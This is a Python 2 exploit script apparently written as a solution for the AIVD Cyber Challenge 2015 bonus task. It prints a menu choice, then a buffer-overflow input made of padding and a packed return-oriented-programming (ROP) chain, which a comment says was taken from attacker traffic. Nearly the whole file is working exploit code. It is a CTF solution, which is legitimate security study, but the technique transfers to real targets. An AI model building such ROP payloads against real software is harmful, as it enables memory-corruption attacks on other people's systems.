#!/usr/bin/env python
#
# AIVD Cyber Challenge 2015 (BONUS)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from struct import pack

stage_0 = "3"

sploit = "5 " + "A"*26

# ROP chain (as extracted from attacker traffic PCAP)
rop_chain = [0x80b4e10, 0x810503c, 0x816d900, 0x8119340, 0x80c5050, 0x810503c, 0x816d8c7, 0x0000, 0x80c51b0, 0x810503b, 0x0003, 0x816d908, 0x0017, 0x8049390, 0x810503c, 0x816d900, 0x0007, 0x8049390, 0x810503c, 0x816d900, 0x0009, 0x8049390, 0x810503c, 0x816d900, 0x000b, 0x8049390, 0x810503c, 0x816d900, 0x000d, 0x8049390, 0x810503c, 0x816d900, 0x000f, 0x8049390, 0x810503c, 0x816d900, 0x0011, 0x8049390, 0x810503c, 0x816d900, 0x0013, 0x8049390, 0x810503c, 0x816d900, 0x0015, 0x8049390, 0x810503c, 0x816d900, 0x0017, 0x8049390, 0x810503c, 0x816d900, 0x0019, 0x8049390, 0x810503c, 0x816d900, 0x001b, 0x8049390, 0x810503c, 0x816d900, 0x001d, 0x8049390, 0x810503c, 0x816d900, 0x001f, 0x8097300]

for gadget in rop_chain:
	sploit += pack('<I', gadget)

print stage_0
print sploit